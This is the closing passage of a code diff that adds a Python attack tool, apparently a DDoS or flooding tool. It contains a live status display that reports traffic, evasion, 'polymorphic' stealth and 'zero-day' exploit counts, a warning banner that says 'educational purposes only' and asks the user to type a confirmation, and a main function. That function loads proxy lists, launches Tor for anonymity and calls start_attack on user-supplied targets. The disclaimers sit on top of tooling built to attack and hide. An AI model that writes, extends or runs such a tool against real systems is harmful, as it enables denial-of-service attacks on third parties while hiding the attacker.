+            print(f"\r[VPS] Active: {active_nodes} | Traffic: {total_traffic:.1f}MB | "
+                  f"CPU Dist: {dict(ATTACK_STATS['vps_stats']['cpu_distribution'])}")
+            print(f"\r[AI] Evolution: {ai_evolution} | Best Methods: {', '.join(best_methods)} | "
+                  f"Adaptation: {'ON' if ADAPTATION_ENABLED else 'OFF'}")
+            print(f"\r[EVASION] Stealth Success: {stealth_success} | Polymorphic: {'ON' if PERFECT_MODE else 'OFF'} | "
+                  f"Timing Obfuscation: {'ON' if LOAD_BALANCING else 'OFF'}")
+            print(f"\r[ZERO-DAY] Exploits: {zero_day_success} | "
+                  f"Simulated: {len(zero_day.exploit_database)} | "
+                  f"Success Rate: {success_rate:.1f}%")
+            print(f"\r" + "="*200, end="")
+        
+        time.sleep(1)
+
+# ===================== SUPER WARNING SYSTEM =====================
+def super_warning_system():
+    """Warning system super ketat"""
+    warnings = [
+        "⚠️  THIS TOOL IS FOR EDUCATIONAL PURPOSES ONLY!",
+        "⚠️  USING THIS TOOL AGAINST SYSTEMS WITHOUT PERMISSION IS ILLEGAL!",
+        "⚠️  VIOLATION MAY RESULT IN 12+ YEARS IMPRISONMENT (UU ITE PASAL 30)!",
+        "⚠️  INTERNATIONAL LAWS APPLY (CFAA, NIS DIRECTIVE)!",
+        "⚠️  USE ONLY IN YOUR OWN LAB ENVIRONMENT!",
+        "⚠️  WE ARE NOT RESPONSIBLE FOR YOUR ACTIONS!",
+        "⚠️  WITH GREAT POWER COMES GREAT RESPONSIBILITY!"
+    ]
+    
+    print("\n" + "═" * 100)
+    for warning in warnings:
+        print(f"\r{warning}")
+    print("═" * 100)
+    
+    # Force confirmation
+    confirmation = input("\nTYPE 'I UNDERSTAND' TO CONTINUE: ")
+    if confirmation != "I UNDERSTAND":
+        print("[!] Exiting...")
+        sys.exit(1)
+    
+    # Random warnings during attack
+    def random_warning():
+        while True:
+            time.sleep(random.randint(60, 300))  # 1-5 minutes
+            warning = random.choice(warnings)
+            print(f"\n\r[!] {warning}")
+    
+    warning_thread = threading.Thread(target=random_warning)
+    warning_thread.daemon = True
+    warning_thread.start()
+
+# ===================== MAIN FUNCTION =====================
+def main():
+    global DURATION, THREADS, PROTOCOL, ADAPTATION_ENABLED, AUTO_SCRAPE_PROXY, PERFECT_MODE, VPS_SIMULATION, LOAD_BALANCING, FULL_METHODS, targets, PROXY_LIST, TOR_PROXY, ai_optimizer, evasion, zero_day
+    
+    # Print license and disclaimer
+    print(LICENSE)
+    print(DISCLAIMER)
+    
+    # Super warning
+    super_warning_system()
+    
+    # Get user input from CLI menu
+    options = cli_menu()
+    
+    # Set global variables
+    DURATION = options['duration']
+    THREADS = options['threads']
+    ADAPTATION_ENABLED = options['adaptation']
+    AUTO_SCRAPE_PROXY = options['scrape']
+    PERFECT_MODE = options['perfect']
+    VPS_SIMULATION = options['vps_simulation']
+    LOAD_BALANCING = options['load_balancing']
+    FULL_METHODS = options['full_methods']
+    targets = options['targets']
+    
+    # Initialize components
+    if VPS_SIMULATION:
+        initialize_vps_nodes(options['vps_nodes'])
+    
+    if options['proxy_file']:
+        load_proxies(options['proxy_file'])
+    
+    tor_process = None
+    if options['tor']:
+        tor_process = setup_tor()
+    
+    # Initialize AI and advanced components
+    ai_optimizer = AIAttackOptimizer()
+    evasion = AdvancedEvasion()
+    zero_day = ZeroDaySimulator()
+    
+    # Start attack
+    start_attack(options['method'], targets)
+    
+    # Cleanup
+    if tor_process:
+        tor_process.terminate()
+
+if __name__ == "__main__":
+    main()
